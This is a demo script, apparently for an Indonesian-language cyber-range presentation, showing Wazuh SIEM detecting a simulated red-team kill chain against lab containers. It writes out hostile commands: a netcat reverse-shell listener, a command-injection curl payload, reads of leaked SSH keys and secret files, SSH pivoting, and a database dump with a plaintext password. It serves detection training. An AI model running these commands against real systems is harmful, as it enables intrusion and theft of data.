# Demo Walkthrough - Network Traversal Hunt

Script lengkap buat presentasi demo. Estimated duration: **15-20 menit**.

## Pre-Demo Checklist

5 menit sebelum demo:

- [ ] Lab udah running (`docker compose ps` semua healthy)
- [ ] Wazuh Dashboard accessible di browser
- [ ] Login dashboard berhasil
- [ ] 3 agent registered: `dmz-web`, `internal-app`, `db-server`
- [ ] Browser tab disiapin: Dashboard, Discover, Security Events
- [ ] Terminal di Red VM siap dengan working directory yang bener
- [ ] Terminal di Blue VM siap (kalau perlu kunci-an URL via Guacamole)
- [ ] Screen recorder ON (backup kalau live demo gagal)

## Demo Script

### 1. Introduction (3 menit)

**Objective:** Audiens paham apa yang bakal mereka liat.

**Talking points:**
- "Ini cyber range simulasi network traversal attack"
- "Setup: 3 target server di-monitor sama Wazuh SIEM"
- "Akan demo: Red attacker melakukan kill chain dari recon sampai data exfil"
- "Sambil dilihat, Blue team monitor real-time alert di SIEM"

**Show diagram:** `README.md` arsitektur diagram

---

### 2. Show Empty State (1 menit)

**Action di Blue Dashboard:**

1. Buka `https://<host>:443`
2. Login: `admin` / `SecretPassword`
3. Navigasi ke **Wazuh > Modules > Security Events**
4. Tunjuk: "Sekarang masih sepi, belum ada attack"
5. Buka tab **Discover** → set time range "Last 15 minutes"

**Kalimat:** "Mari kita liat bagaimana Wazuh detect attack dalam waktu nyata."

---

### 3. Phase 1 - Reconnaissance (2 menit)

**Action di Red Terminal:**

```bash
# Pre-set environment
export TARGET_IP=10.10.10.10
export ATTACKER_IP=10.10.10.99

# Run recon script
./scripts/attack/01-recon.sh
```

**Sambil script jalan, narasi:**
- "Attacker mulai dari nmap port scan"
- "Discover web service running di port 80"
- "Web service ini punya parameter `host` yang suspicious"

**Action di Blue Dashboard:**

1. Refresh **Security Events**
2. Tunjuk alert yang muncul (kemungkinan: web access log masuk)
3. Buka **Discover** → query: `data.srcip:10.10.10.99`
4. Tunjuk: "Liat IP attacker udah ke-track di sini"

---

### 4. Phase 2 - Initial Access (4 menit)

**Action di Red Terminal:**

Terminal #1 (listener):
```bash
nc -lvnp 4444
```

Terminal #2 (exploit):
```bash
# Test command injection
curl "http://10.10.10.10/?host=8.8.8.8;id"

# Trigger reverse shell
./scripts/attack/02b-trigger-shell.sh
```

**Sambil script jalan, narasi:**
- "Attacker eksploitasi command injection vulnerability"
- "Pertama test dengan command sederhana: `id`"
- "Sekarang trigger reverse shell - perhatikan listener kita"

**Setelah shell connect, di shell session:**
```bash
id
hostname
whoami
ls -la /var/www/html/
cat /var/www/html/.maintenance_key  # leaked SSH key
```

**Action di Blue Dashboard - INI MOMENT IMPORTANT:**

1. Refresh **Security Events**
2. Filter: `rule.level:>=10`
3. **Tunjuk alert critical yang muncul:**
   - Rule 100110: Command injection attempt
   - Rule 100111: Suspicious payload in web request
   - Rule 100120 / 100121: Shell spawned from web service
4. Klik salah satu alert → expand → tunjuk MITRE technique

**Kalimat impactful:**
> "Liat di sini - dalam hitungan detik setelah attack, Wazuh udah catch reverse shell. Notice rule level 14, mapped ke MITRE T1190 (Exploit Public-Facing Application) dan T1059 (Command and Scripting Interpreter)."

---

### 5. Phase 3 - Lateral Movement (3 menit)

**Action di reverse shell:**
```bash
# SSH ke internal-app pakai leaked key
chmod 600 /var/www/html/.maintenance_key
ssh -o StrictHostKeyChecking=no -i /var/www/html/.maintenance_key webapp@172.20.0.20

# Setelah masuk
id
hostname
cat ~/app/.env
cat ~/app/config/database.yml
cat ~/.bash_history
```

**Action di Blue Dashboard:**

1. Refresh alerts
2. **Tunjuk alert:**
   - Rule 100150 / 100151: SSH from DMZ network (lateral movement)
   - Rule 100141: Access to potential secret file
3. Buka **Modules > MITRE ATT&CK** → tunjuk technique mapping

**Kalimat:**
> "Sekarang Blue team bisa liat full attack chain. Attacker udah pivot dari DMZ ke internal network. MITRE T1021.004 - Remote Services SSH."

---

### 6. Phase 4 - Data Exfiltration (3 menit)

**Action di internal-app shell:**
```bash
# Connect ke database
mysql -h db-server -u appuser -pAppDB_P@ssw0rd_2024 customers -e "SELECT * FROM customers LIMIT 5;"

# Get the flag
mysql -h db-server -u appuser -pAppDB_P@ssw0rd_2024 customers -e "SELECT * FROM internal_flags;"

# Dump database
mysqldump -h db-server -u appuser -pAppDB_P@ssw0rd_2024 customers > /tmp/loot.sql
ls -la /tmp/loot.sql
```

**Action di Blue Dashboard:**

1. Refresh alerts
2. **Tunjuk alert:**
   - Rule 100161: Database client invoked with credentials
   - Rule 100160: Database dump tool executed
3. Buka **Discover** → filter `agent.name:db-server`
4. Show timeline: dari recon sampe exfil

**Kalimat closing attack:**
> "Full kill chain achieved dalam waktu <10 menit. Kalau ini production, Blue team udah punya semua data buat incident response: timeline lengkap, MITRE mapping, IOC, affected hosts."

---

### 7. Blue Team Response Demo (3 menit)

**Action di Blue Dashboard:**

1. Buka Wazuh **Modules > Security Events**
2. Set filter: `rule.groups:critical OR rule.groups:attack_chain`
3. Tunjuk timeline dari pertama alert sampe terakhir
4. Buka 1 alert critical → expand
5. Tunjuk:
   - Source IP attacker
   - Affected agent
   - MITRE technique
   - Raw log evidence

6. **Demonstrate hunt query:**

   Buka **Discover** dengan query:
   ```
   data.audit.exe:"/usr/bin/ssh" AND agent.name:dmz-web
   ```

   Narasi: "Blue analyst bisa hunt manual: 'cari semua execution SSH dari dmz-web yang gak biasa'"

7. **Demonstrate containment plan** (verbal):
   - Block source IP di firewall
   - Isolate dmz-web container: `docker network disconnect internal_net dmz-web`
   - Reset webapp credentials di internal-app
   - Hunt persistence di semua agent
   - Document timeline buat post-incident review

---

### 8. Closing (2 menit)

**Talking points:**
- "Demo nunjukin: vulnerable target → attack → real-time detection → response"
- "Custom Wazuh rules cover MITRE technique standard"
- "Architecture: container-based, scalable, ready buat multi-user"
- "Roadmap: scoring engine, multi-scenario library, multi-tenant"

**Q&A**

---

## Backup Plan

Kalau live demo gagal:

1. **Pre-recorded video** sebagai fallback (record full run sebelumnya)
2. **Screenshot deck** kalau dashboard lemot
3. **Static demo** - cukup tunjuk dashboard + alert yang udah ada

## Demo Tips

- **Pre-warm** semua container 30 menit sebelum demo (avoid cold start)
- **Pre-trigger** beberapa alert dulu sebelum demo, biar dashboard udah ada history
- **Pakai dual screen**: Red terminal di kiri, Blue dashboard di kanan
- **Rehearsal minimal 2x** sebelum demo real
- **Disable notifications** di laptop demo
- **Set browser zoom 125%** biar audience bisa baca

## Common Demo Pitfalls

| Pitfall | Mitigation |
|---------|-----------|
| Wazuh Indexer cold start lama | Pre-warm container 30 menit sebelumnya |
| Network connectivity issue Kali ↔ target | Test routing dulu sebelum demo |
| Browser cache nampilin alert lama | Hard refresh (Ctrl+F5) |
| Reverse shell gak masuk | Sediakan backup payload (curl-based, bukan bash) |
| Dashboard auth fail | Reset password via API |
